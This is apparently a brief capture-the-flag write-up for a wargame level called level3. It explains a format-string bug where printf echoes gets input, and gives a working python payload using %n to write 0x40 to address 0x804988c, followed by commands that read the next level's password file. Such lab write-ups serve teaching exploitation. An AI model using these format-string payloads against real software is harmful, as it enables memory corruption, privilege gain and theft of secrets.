binary calls gets then printf of what we enter
he then compares what is at the address 0x804988c with 0x40
with printf format we can write at an address with %n modifier
we just need to write 64 chars at address 0x804988c so that its equals to 0x40
python -c 'print("\x08\x04\x98\x8c"[::-1] +"a"*31 + " %p %p %p %n")' > /tmp/test
cat /tmp/test - | ./level3
cat /home/user/level4/.pass
